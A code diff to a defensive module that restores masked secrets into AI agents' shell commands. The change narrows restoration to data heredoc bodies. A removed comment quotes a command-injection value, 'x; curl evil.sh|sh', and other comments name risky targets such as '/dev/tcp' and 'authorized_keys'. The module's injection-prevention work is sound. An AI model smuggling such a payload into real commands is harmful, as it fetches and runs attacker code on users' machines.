@@ -7,66 +7,47 @@ import { PLACEHOLDER_REGEX, type RestoreCapable, type RestoreResult } from 'null
  *
  * A masked value comes from data the model could not read: a file the
  * agent opened, a tool result. Put back verbatim into a shell command, it
- * can change what the command does. A "secret" that reads
- * `x; curl evil.sh|sh` turns `echo {{PII_SECRET_0_…}}` into a second
- * command once restored. So in the `command` of a shell tool, a value
- * comes back only into a command written in a small grammar read whole
- * (`advance`): words, single quotes, double quotes without `$`, a backtick
- * or a backslash, `&&`, `||`, `|`, `;`, line breaks, redirections and
- * heredocs. Anything else (any `$`, backticks, backslashes, parentheses,
- * braces, comments, a lone `&` (also `&>`), `>!`, `>>&`, `;;`, `[[`, `<<<`,
- * control characters, U+2028/U+2029, a heredoc operator with no body, a reserved word
- * such as `if` or `case` where a program could stand) keeps every
- * placeholder: shells disagree on how such
- * constructs nest and end. Within that grammar, every program must be on a
- * closed list of programs that read their arguments as data
- * (`ARG_DATA_PROGRAMS`), and a value comes back only as one plain word:
- * letters, digits and `@+:,./_=-`, not starting with `-`, `=`, `~`, `@` or `//`.
- * Otherwise the placeholder stays literal, and the command works on the
- * placeholder text, which is harmless.
+ * can change what the command does. So in the command of a shell tool a
+ * value comes back only as text the command writes out as data, never
+ * into a word of the command: the body of a heredoc that `cat` writes to
+ * standard output or to a document file (`PLAIN_DATA_FILE`), or that
+ * `git commit -F -` reads as its message (`cat > notes.md <<'EOF'`,
+ * `git commit -F - <<'EOF'`). Such a body is data, as a file the `Write`
+ * tool writes is, so only a line break or another control character but
+ * tab is refused in a value (and, in a bare-delimiter body, `$`, a
+ * backtick or a backslash).
  *
- * On top of that:
- * - a listed program counts only by name exactly as written, with no
- *   wrapper, no path, no redirection before it, no assignment other than
- *   the locale or time zone with a plain value (`SAFE_ASSIGNMENT`; before
- *   it, or as a command of its own: `PATH=…; grep …`), and with none of the options that run, write or set a variable
- *   (`COMMAND_OPTIONS`, abbreviations and short-option clusters included);
- * - a placeholder that is, or is part of, the program a simple command
- *   runs, a redirection target, an assignment, an argument of `export` or
- *   `alias`, a `cd` argument, or a placeholder written in shell code
- *   directly before `<` or `>` stays
- *   masked: a value must not choose what runs, what is written or the
- *   directory later commands (git among them) run in;
- * - within the list, a command that sends data off the machine (a URL,
- *   `/dev/tcp`) or runs code through an option (`find -exec`, `rg --pre`,
- *   `git -c`) keeps every placeholder, also when judged again with the
- *   values put back, and so does one that writes any file but a document
- *   (`PLAIN_DATA_FILE`; `/dev/null` and the standard streams are no
- *   file), or a relative file in a command that also runs `cd`;
- * - judged again with the values put back, the command must also split
- *   into the same simple commands and heredoc bodies as before, or it
- *   keeps every placeholder;
- * - the one exception to the plain-word rule is the body of a heredoc that
- *   `cat` writes to standard output or to a document file (`.md`, `.csv`,
- *   …; `PLAIN_DATA_FILE`), or that `git commit -F -` reads as its message,
- *   in a command that runs nothing else that could read it as code
- *   (`cat > notes.md <<'EOF'`, `git commit -F - <<'EOF'`): that body is
- *   data, as a file the `Write` tool writes is, so only a line break or
- *   another control character but tab is refused (and in a
- *   bare-delimiter body, `$`, a backtick or a backslash). The network checks skip such a body, so a commit message
- *   that mentions `ssh` does not count as a network call.
+ * The body gets values only when the whole command passes:
+ * - a small grammar read whole (`advance`): words, single quotes, double
+ *   quotes without `$`, a backtick or a backslash, `&&`, `||`, `|`, `;`,
+ *   line breaks, redirections and heredocs. Anything else (any `$`,
+ *   backticks, backslashes, parentheses, braces, comments, a lone `&`
+ *   (also `&>`), `>!`, `>>&`, `;;`, `[[`, `<<<`, control characters,
+ *   U+2028/U+2029, a heredoc operator with no body, a reserved word where
+ *   a program could stand) keeps every placeholder: shells disagree on how
+ *   such constructs nest and end;
+ * - data programs only (`DATA_PROGRAMS`), each by name exactly as written,
+ *   with no wrapper, path or redirection before it, no assignment other
+ *   than the locale or time zone with a plain value (`SAFE_ASSIGNMENT`),
+ *   and none of the options that run, write or set a variable
+ *   (`COMMAND_OPTIONS`);
+ * - nothing that sends data off the machine or runs code (the network and
+ *   code checks skip data bodies, so a commit message that mentions `ssh`
+ *   is no network call), no write to a file but a document, and no
+ *   relative write after a `cd` or with a working directory of the call's
+ *   own (`ShellOptions.movedDir`);
+ * - judged again with the values put back, the same checks and the same
+ *   split into simple commands and heredoc bodies.
  *
  * The command is read once, in time linear in its length, whatever the
  * number of placeholders; a command longer than `MAX_COMMAND_CHARS`, with
  * a simple command past the read window (more than `MAX_WORD_SCAN`
  * characters, or `MAX_WORDS` words or more, heredoc bodies not counted),
- * or with a heredoc body
- * whose closing line cannot be found keeps every placeholder, and one whose
- * quoting is left open loses the heredoc exception. `<<` counts only in shell code, never
- * inside quotes. A `command` given as an argv array
- * (`["bash", "-lc", "…"]`) is judged by `restoreShellArgv`. The Claude
- * Code mod gets the same rules through the sidecar's `restore` with
- * `tool`.
+ * or with a heredoc body whose closing line cannot be found keeps every
+ * placeholder. A `command` given as an argv array (`["bash", "-lc", "…"]`)
+ * is judged by `restoreShellArgv`: only its `-c` script gets values. The
+ * Claude Code mod gets the same rules through the sidecar's `restore`
+ * with `tool`.
  *
  * Best effort for what leaves the machine: no list names every network
  * client, and a value restored into a file (`Write`, `Edit`) can be sent
@@ -132,13 +113,6 @@ const DATA_BODY_CONTEXTS: ReadonlySet<QuoteContext> = new Set<DataBodyContext>([
   'heredoc',
   'heredoc-expanding',
 ]);
-
-/** A value that may be restored outside a data heredoc body: one plain
- * word, with no character any shell or quoting gives a meaning to (no `%`,
- * which `cmd.exe` expands), and not starting with `-` (an option), `=`
- * (zsh's `=cmd` expansion), `~` (a home directory), `@` (PowerShell
- * splatting) or `//` (a network path under Windows' POSIX layers). */
-const PLAIN_WORD = /^(?![-=~@])(?!\/\/)[\p{L}\p{N}@+:,./_=-]+$/u;
 
 /** What a value may hold in a data heredoc body. */
 const DATA_BODY_SAFE: Readonly<Record<DataBodyContext, RegExp>> = {
@@ -613,72 +587,9 @@ const DATA_PROGRAMS: ReadonlySet<string> = new Set([
   ':',
 ]);
 
-/** The programs a value may be restored into: each reads its arguments
- * as data, opens no connection and runs no code it is handed. A command
- * that runs any other program keeps every placeholder: no list can name
- * every program that sends data out or runs code, so the default is to
- * restore nothing. Programs that write where an argument says (`cp`,
- * `mv`, `rm`, `tee`, `install`) are left out, so a value cannot choose
- * what is overwritten or deleted. */
-const ARG_DATA_PROGRAMS: ReadonlySet<string> = new Set([
-  'ls',
-  'cat',
-  'head',
-  'tail',
-  'wc',
-  'grep',
-  'egrep',
-  'fgrep',
-  'rg',
-  'find',
-  'stat',
-  'file',
-  'du',
-  'df',
-  'diff',
-  'cmp',
-  'sort',
-  'cut',
-  'tr',
-  'jq',
-  'echo',
-  'mkdir',
-  'cd',
-  'pwd',
-  'touch',
-  'basename',
-  'dirname',
-  'realpath',
-  'readlink',
-  'sha256sum',
-  'sha1sum',
-  'md5sum',
-  'shasum',
-  'base64',
-  'column',
-  'nl',
-  'true',
-  'false',
-  ':',
-]);
-
 // `printf`, `test` and `[` are left off: zsh and ksh93 may read their
 // arguments as arithmetic, which can assign a variable for every later
 // command, in more forms than a rule can list. `echo` prints a value.
-
-/** `git` subcommands a value may be restored into. */
-const ARG_DATA_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set([
-  'log',
-  'status',
-  'diff',
-  'show',
-  'add',
-  'commit',
-  'blame',
-  'grep',
-  'ls-files',
-  'rev-parse',
-]);
 
 /** `git` subcommands that read their arguments as data and run no code
  * on them, so a commit message heredoc in `git add … && git commit …`
@@ -702,20 +613,6 @@ const ANY_DELIMITER_IN_TEXT = /(?<![\w.-])(?:g?sed|perl|ruby|irb)(?![\w.-])/;
 /** A redirection operator at the start of a word, with its descriptor. */
 const REDIRECTION_OPERATOR =
   /^(?:\d+|\{[A-Za-z_]\w*\})?(?:&>>?[|!]?|>>?[|!]|>&|<&|<<<|<<-?|<>|>>?|<)/;
-
-/** Shell builtins whose arguments set what later commands run or see
- * (`export LD_PRELOAD=…`, `alias ll=…`): a value is never restored there. */
-const ENVIRONMENT_BUILTINS: ReadonlySet<string> = new Set([
-  'export',
-  'declare',
-  'typeset',
-  'local',
-  'readonly',
-  'alias',
-  'set',
-  'unset',
-  'shopt',
-]);
 
 /** Files a shell, git or a hook runner executes later: a heredoc written
  * to one is code, not data. */
@@ -856,11 +753,6 @@ const LEADING_TABS = /^\t+/;
 /** The start of a word that a following `<` or `>` continues: nothing,
  * a descriptor number, or the operator so far (`2>`, `>`, `<`). */
 const REDIRECTION_HEAD = /^\d*[<>]*$/;
-/** A redirection word (`>`, `2>>log`, `&>`, `<in`, `<'a b'` with its
- * quotes removed); group 1 is empty when the operator stands alone and
- * its target is the next word. */
-const REDIRECTION =
-  /^(?:\d+|\{[A-Za-z_]\w*\})?(?:&>>?[|!]?|>>?[|!]|>&|<&|<<<|<<-?|<>|>>?|<)([\s\S]*)$/;
 /** A version or `.exe` suffix on a program name (`python3.12`, `pwsh.exe`). */
 const PROGRAM_SUFFIX = /(?:[\d.]+|\.exe)$/;
 
@@ -960,10 +852,6 @@ interface Verdict {
   /** It runs code it is handed, or could not be read whole: nothing is
    * restored, since where a value lands in that code is unknown. */
   readonly runsCode: boolean;
-  /** The placeholder positions where no value is restored: the program a
-   * simple command runs or part of it, an assignment, a redirection
-   * target, the arguments of `cd`, `export`, `alias` and the like. */
-  readonly programAt: ReadonlySet<number>;
   /** How the command splits: its simple commands and heredoc bodies. */
   readonly layout: Layout;
 }
@@ -979,7 +867,6 @@ const KEEP_ALL: Verdict = {
   offMachine: true,
   runsCode: true,
   contextAt: new Map(),
-  programAt: new Set(),
   layout: { commands: [], bodies: [] },
 };
 
@@ -1009,13 +896,6 @@ const NO_VALUE: ShellTool = { commandField: undefined };
  * socket. */
 export function sendsOffMachine(command: string): boolean {
   return judge(command, []).offMachine;
-}
-
-/** True when `value` can be put back as written in `context`: one plain
- * word, or in a data heredoc body a value that cannot end the body. */
-export function shellSafe(value: string, context: QuoteContext): boolean {
-  if (isDataBody(context)) return DATA_BODY_SAFE[context].test(value);
-  return PLAIN_WORD.test(value);
 }
 
 function isDataBody(context: QuoteContext): context is DataBodyContext {
@@ -1055,7 +935,7 @@ function judge(command: string, targets: readonly number[], options: ShellOption
   }
   const read = readCommands(command, scan);
   if (read === undefined) return KEEP_ALL;
-  const { programs, wordsAt } = read;
+  const { programs } = read;
   // Data bodies are text written out, not commands: a commit message that
   // mentions `ssh` or `bash -c` neither sends nor runs anything.
   const code = withoutRanges(command, scan.dataBodies);
@@ -1094,32 +974,24 @@ function judge(command: string, targets: readonly number[], options: ShellOption
     programs,
     strict || !closed || writesExecuted || !toPlainFiles,
   );
-  // Any program outside the allowlist (`ARG_DATA_PROGRAMS`) keeps every
+  // Any program outside the data programs (`DATA_PROGRAMS`) keeps every
   // placeholder too: the lists above are a second line, not the rule.
-  const unlisted = !programs.every(takesDataArgs);
+  const unlisted = !programs.every(isDataProgram);
   // A command that writes anything but a document, through a heredoc or
   // any other redirection (`echo {{…}} > run.sh`), may have it read later
   // as code or configuration: nothing comes back into it.
   const toCodeFile = !toPlainFiles;
-  // Nothing comes back from a command judged whole: its positions need no
-  // reading.
-  const keepAll = offMachine || strict || writesExecuted || unlisted || toCodeFile;
   const contextAt = new Map<number, QuoteContext>();
-  const programAt = new Set<number>();
-  const sorted = [...scan.commands].sort((a, b) => a[0] - b[0]);
   targets.forEach((index, k) => {
     const context = scan.contexts[k] ?? 'none';
     if (strict) contextAt.set(index, 'none');
     else if (isDataBody(context)) contextAt.set(index, bodyContext(context));
     else contextAt.set(index, context);
-    if (keepAll) return;
-    if (holdsAt(index, sorted, wordsAt)) programAt.add(index);
   });
   return {
     offMachine,
     runsCode: strict || writesExecuted || unlisted || toCodeFile,
     contextAt,
-    programAt,
     layout: { commands: scan.commands, bodies: scan.bodies },
   };
 }
@@ -1197,77 +1069,6 @@ function withoutRanges(text: string, ranges: ReadonlyArray<readonly [number, num
   return out + text.slice(last);
 }
 
-/** True when no value may be restored at `index`: the placeholder stands
- * in the program word of the simple command around it (the words before
- * it are only assignments, redirections and wrappers), in an assignment,
- * in a redirection target, or in the arguments of `cd`, `export`, `alias`
- * and the like. A command past the
- * read window never gets here: `judge` keeps every placeholder of it. */
-function holdsAt(
-  index: number,
-  sorted: ReadonlyArray<readonly [number, number]>,
-  wordsAt: ReadonlyMap<number, readonly Word[]>,
-): boolean {
-  const start = enclosingStart(sorted, index);
-  if (start === undefined) return false;
-  const words = wordsAt.get(start);
-  // Defensive: every command with a placeholder has its words read. One
-  // without, or a placeholder in none of them, has an unknown role, so it
-  // is held.
-  if (words === undefined) return true;
-  const offset = index - start;
-  const k = words.findIndex((w) => w.end > offset);
-  const own = words[k];
-  if (own === undefined || own.start > offset) return true;
-  const before = words.slice(0, k);
-  // An assignment before the program sets the environment it runs with;
-  // `--grep user={{…}}` after it is an argument.
-  if (ENV_ASSIGNMENT.test(own.text) && programIsNext(before)) return true;
-  // A redirection target is a file the command writes or reads: a value
-  // there would choose which (`> ~/.ssh/authorized_keys`).
-  if (REDIRECTION.test(own.text)) return true;
-  if (before.length > 0 && REDIRECTION.exec(before.at(-1)?.text ?? '')?.[1] === '') return true;
-  if (programIsNext(before)) return true;
-  // `cd` chooses the directory every later command runs in, this one's
-  // and, in a shell kept across calls, the next one's (git reads its
-  // configuration and hooks there).
-  const program = programOf(before);
-  if (program === undefined) return false;
-  if (program.name === 'cd') return true;
-  return ENVIRONMENT_BUILTINS.has(program.name);
-}
-
-/** The start of the command extent around `index`, from extents sorted
- * by start (they do not nest): the last one that starts at or before
- * `index`, when it reaches it. */
-function enclosingStart(
-  sorted: ReadonlyArray<readonly [number, number]>,
-  index: number,
-): number | undefined {
-  let lo = 0;
-  let hi = sorted.length;
-  while (lo < hi) {
-    const mid = (lo + hi) >> 1;
-    if ((sorted[mid]?.[0] ?? 0) <= index) lo = mid + 1;
-    else hi = mid;
-  }
-  const extent = sorted[lo - 1];
-  return extent !== undefined && extent[1] >= index ? extent[0] : undefined;
-}
-
-/** True when the word after `words` would be the program they run. */
-function programIsNext(words: readonly Word[]): boolean {
-  let k = skipPrefix(words, 0);
-  for (;;) {
-    const word = words[k];
-    if (word === undefined) return true;
-    const name = normalise(word.text);
-    const options = WRAPPERS.get(name);
-    if (options === undefined) return false;
-    k = skipWrapperArgs(words, k + 1, name, options).next;
-  }
-}
-
 /** What a data heredoc body's context becomes, given the programs the
  * command runs: kept when they all treat it as data, the strictest rule
  * when one runs a file, else the double-quote rule. */
@@ -1304,16 +1105,8 @@ function runsFile(p: Program): boolean {
   return p.byPath || RUNS_FILE_PROGRAMS.has(p.name);
 }
 
-/** True when a value may be restored into `p`'s command (`ARG_DATA_PROGRAMS`). */
-function takesDataArgs(p: Program): boolean {
-  if (!listedAsWritten(p)) return false;
-  if (p.redirectedPrefix) return false;
-  if (p.literal === 'git') return ARG_DATA_GIT_SUBCOMMANDS.has(p.args[0] ?? '');
-  return ARG_DATA_PROGRAMS.has(p.literal ?? '');
-}
-
 function isDataProgram(p: Program): boolean {
-  if (!listedAsWritten(p)) return false;
+  if (!listedAsWritten(p) || p.redirectedPrefix) return false;
   if (p.literal === 'git') return DATA_GIT_SUBCOMMANDS.has(p.args[0] ?? '');
   return DATA_PROGRAMS.has(p.literal ?? '');
 }
@@ -1493,12 +1286,22 @@ function skipPrefix(words: readonly Word[], k: number): number {
   }
 }
 
+/** Program names that end in digits: no version suffix to strip. */
+const NAMES_WITH_DIGITS: ReadonlySet<string> = new Set([
+  'base64',
+  'sha1sum',
+  'sha256sum',
+  'sha512sum',
+  'md5sum',
+  'b2sum',
+]);
+
 /** A program name as the sets list it: no directory, lower case, no
  * version or `.exe` suffix (`/usr/bin/Python3.12` → `python`). */
 function normalise(word: string): string {
   const base = (word.split('/').at(-1) ?? word).toLowerCase();
   // `base64` is a name, not `base` version 64.
-  if (ARG_DATA_PROGRAMS.has(base)) return base;
+  if (NAMES_WITH_DIGITS.has(base)) return base;
   const bare = base.replace(PROGRAM_SUFFIX, '');
   return bare === '' ? base : bare;
 }
@@ -1868,12 +1671,11 @@ export function restoreShellCommand(
     command,
     sessionId,
     (value, at) => {
-      if (keepAll || verdict.programAt.has(at)) return false;
+      if (keepAll) return false;
+      // A value comes back only into a heredoc body written out as data,
+      // never into a word of shell code.
       const context = verdict.contextAt.get(at) ?? 'none';
-      // Glued to a redirection in shell code (`{{…}}>notes.md`), a value of
-      // digits would become its file descriptor.
-      if (context === 'none' && gluedToRedirection(command, at)) return false;
-      return shellSafe(value, context);
+      return isDataBody(context) && DATA_BODY_SAFE[context].test(value);
     },
     shifts,
   );
@@ -1886,18 +1688,6 @@ export function restoreShellCommand(
   const same = sameLayout(verdict.layout, after.layout, shifts);
   if (same && !after.offMachine && !after.runsCode) return restored;
   return restoreEach(np, command, sessionId, () => false);
-}
-
-/** True when the placeholder at `at` is followed by `<` or `>`, directly
- * or after digits: a value of digits would join them into the descriptor
- * number (`{{…}}2>err.log` with `1` is `12>err.log` in bash). */
-function gluedToRedirection(command: string, at: number): boolean {
-  const placeholder = new RegExp(PLACEHOLDER_REGEX.source, 'y');
-  placeholder.lastIndex = at;
-  if (!placeholder.test(command)) return false;
-  const operator = /\d*[<>]/y;
-  operator.lastIndex = placeholder.lastIndex;
-  return operator.test(command);
 }
 
 /** Where restoring one placeholder changed a command's length: at `at`
@@ -1953,13 +1743,10 @@ export interface ShellArgvRestore {
 /**
  * Restore the placeholders of a `command` given as an argv array, as
  * Codex's `shell` tool sends it (`["bash", "-lc", "…"]`). The program
- * runs without a shell, but the same rules hold as in a string command:
- * - nothing is restored when the program sends data off the machine, or
- *   runs code that may;
- * - a value is restored only as one plain word, never into the program
- *   itself, and never into the arguments of `cd`, `export` and the like;
- * - the script a shell runs (`bash -lc "…"`) is judged as a string
- *   command, program positions and data heredocs included.
+ * runs without a shell. As in a string command, no word gets a value:
+ * only the script a POSIX shell runs with `-c` (`bash -lc "…"`) does,
+ * judged as a string command (data heredoc bodies only), and nothing
+ * when the array sends data off the machine.
  *
  * @param np - the engine whose vault holds `sessionId`.
  */
@@ -1972,31 +1759,14 @@ export function restoreShellArgv(
   const length = argv.reduce((n, a) => n + a.length, 0);
   const offline =
     length <= MAX_COMMAND_CHARS && options.offMachine !== true && !argvSendsOffMachine(argv);
-  const program = argvProgramIndex(argv);
-  const script = shellScriptIndex(argv, program);
-  // A program that runs code gets values back only inside the script a
-  // shell runs, which is judged as a string command; nowhere else.
-  const runs = argvProgram(argv);
-  const code = argvRunsCode(argv) || runs === undefined || !takesDataArgs(runs);
-  // As in shell code, the arguments of `cd`, `export` and the like get no
-  // value.
-  const name = runs?.name ?? '';
-  const held = name === 'cd' || ENVIRONMENT_BUILTINS.has(name);
-  const first = restoreArgvWords(
-    np,
-    argv,
-    sessionId,
-    (position, value) => {
-      if (!offline || position === program || position === 0) return false;
-      if (code || held) return false;
-      return PLAIN_WORD.test(value);
-    },
-    offline ? script : -1,
-    options,
-  );
+  // A value comes back only inside the script a POSIX shell runs with
+  // `-c`, judged as a string command (data heredoc bodies only); no other
+  // word of the array gets one.
+  const script = shellScriptIndex(argv, argvProgramIndex(argv));
+  const first = restoreArgvWords(np, argv, sessionId, () => false, offline ? script : -1, options);
   if (first.results.every((r) => r.replacements === 0)) return first;
   // As for a string command: the values must not change what it is.
-  if (!argvSendsOffMachine(first.argv) && (code || !argvRunsCode(first.argv))) return first;
+  if (!argvSendsOffMachine(first.argv)) return first;
   return restoreArgvWords(np, argv, sessionId, () => false, -1, options);
 }
 
